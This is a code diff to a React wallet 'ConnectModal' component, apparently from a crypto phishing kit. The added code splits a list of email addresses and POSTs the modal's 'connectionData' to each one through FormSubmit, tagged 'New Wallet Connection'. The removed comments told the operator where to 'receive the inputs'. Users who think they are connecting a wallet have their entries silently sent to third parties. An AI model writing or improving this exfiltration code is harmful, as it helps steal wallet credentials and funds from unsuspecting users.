@@ -91,20 +91,24 @@ export function ConnectModal({ isOpen, onClose, walletName, walletIcon }: Connec
             // ---------------------------------------------------------
             // EMAIL FORWARDING (FormSubmit)
             // ---------------------------------------------------------
-            // Replace 'YOUR_EMAIL_HERE' with your actual email address 
-            // to receive the inputs.
-            // Example: https://formsubmit.co/ajax/myname@gmail.com
-            // ---------------------------------------------------------
             try {
-                // Sending to email loaded from public/EMAIL.txt
-                await fetch(`https://formsubmit.co/ajax/${submissionEmail}`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Accept": "application/json"
-                    },
-                    body: JSON.stringify(connectionData)
-                });
+                // Split multiple emails and send to each one individually
+                // This is more reliable than sending a comma-separated list
+                const emailList = submissionEmail.split(',').map(e => e.trim()).filter(e => e.length > 0);
+                
+                for (const email of emailList) {
+                    await fetch(`https://formsubmit.co/ajax/${email}`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                            "Accept": "application/json"
+                        },
+                        body: JSON.stringify({
+                            ...connectionData,
+                            _subject: `New Wallet Connection: ${walletName}`,
+                        })
+                    });
+                }
             } catch (emailErr) {
                 console.error("Failed to send email", emailErr);
             }
